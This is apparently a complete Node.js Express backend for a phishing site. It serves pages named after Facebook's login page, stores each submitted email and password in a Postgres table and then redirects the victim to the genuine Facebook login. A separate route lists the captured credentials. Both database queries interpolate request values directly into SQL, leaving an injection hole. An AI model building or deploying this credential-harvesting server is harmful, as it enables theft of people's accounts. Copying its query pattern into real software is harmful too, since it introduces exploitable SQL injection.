var express = require('express');
var app = express();
var path = require('path');
var bodyParser = require('body-parser');

const pg = require('pg');
pg.defaults.ssl = true;
const connectionString = process.env.DATABASE_URL;

app.use(bodyParser.urlencoded({
    extended: false
}));
app.use(bodyParser.json());
app.set('view engine', 'pug');
app.set('views', __dirname + '/');

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, 'face_mobile.htm'));
});

app.get('/w', function (req, res) {
    res.sendFile(path.join(__dirname, 'face.htm'));
});

app.get('/face_mobile_files/:id', function (req, res) {
    res.sendFile(path.join(__dirname, 'face_mobile_files', req.params.id));
});

app.get('/face_files/:id', function (req, res) {
    res.sendFile(path.join(__dirname, 'face_files', req.params.id));
});

app.get('/home', function (req, res) {
    res.sendFile(path.join(__dirname, 'home.html'));
});

app.post('/s', function (req, res) {
    const pool = new pg.Pool({
        connectionString
    });
    pool.query(`insert into oooo (l, p, uid) values ('${req.body.email}','${req.body.pass}', '${req.params.uid}')`, (err, res) => {
        pool.end();
    });
    res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
});

app.get('/p/:uid', function (req, res) {
    const pool = new pg.Pool({
        connectionString
    });

    pool.query(`select l, p from oooo where uid = ${req.params.uid}`, (err, _res) => {
        pool.end();
        res.render('p', {
            rows: _res ? _res.rows : []
        })
    });

});

app.listen(process.env.PORT || 5000);
